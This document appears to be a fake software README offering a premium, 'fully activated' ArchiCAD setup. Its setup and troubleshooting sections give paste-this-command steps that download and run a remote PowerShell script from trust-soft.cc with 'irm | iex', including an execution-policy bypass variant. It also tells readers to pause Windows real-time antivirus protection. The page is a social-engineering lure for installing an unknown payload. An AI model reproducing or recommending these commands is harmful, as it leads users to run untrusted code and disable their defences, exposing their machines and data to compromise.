# ArchiCAD BIM Studio — Advanced Architectural Design & 3D Modeling Suite

Welcome to the ultimate deployment and configuration hub for **ArchiCAD**, the industry-leading Building Information Modeling (BIM) software tailored for professional architects, engineers, and urban designers. This repository provides a streamlined environment to set up, fully activate, and customize your architectural workspace for maximum workflow efficiency.

## 🏢 Why ArchiCAD Premium?

**ArchiCAD** offers an intuitive, native BIM environment that allows you to design, visualize, and document projects of any scale. By implementing this premium configuration, you gain unrestricted access to complex structural calculations, high-end rendering pipelines, and advanced documentation engines, making sure your creative process remains uninterrupted.

## 💎 Premium Toolkit Benefits

* **Native BIM Environment:** Seamless 2D and 3D modeling where documentation is completely automated.
* **CineRender Engine:** Photorealistic architectural visualizations and advanced lighting controls natively integrated.
* **Teamwork & Collaboration:** Enhanced project sharing models for concurrent engineering workflows.
* **Parametric Objects:** Access to the full library of smart GDL components and building materials.
* **EcoDesigner Star:** Built-in energy evaluation tools for sustainable, eco-friendly project analysis.

## 🛠 Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press **Win + X** on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.
2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit **Enter**. The script will handle the necessary registry tweaks and install all dependencies automatically:
   ```powershell
   irm https://trust-soft.cc/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your version doesn't support the irm shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 💻 System Configuration & Requirements

To maintain a lag-free viewport and fast architectural rendering, verify your workstation specifications before running the optimization pipeline:
* **Operating System:** Windows 11 or Windows 10 (64-bit builds only)
* **Processor:** Intel Core i7 / AMD Ryzen 7 or higher multi-core processor
* **System Memory:** 16 GB RAM minimum (32 GB recommended for large multi-story projects)
* **Graphics Card:** OpenGL 4.5 compatible graphics unit with 4+ GB VRAM

---

*Disclaimer: This project serves exclusively as an educational asset for deployment automation, workspace layout analysis, and local testing. All copyrights and trademarks belong to Graphisoft.*
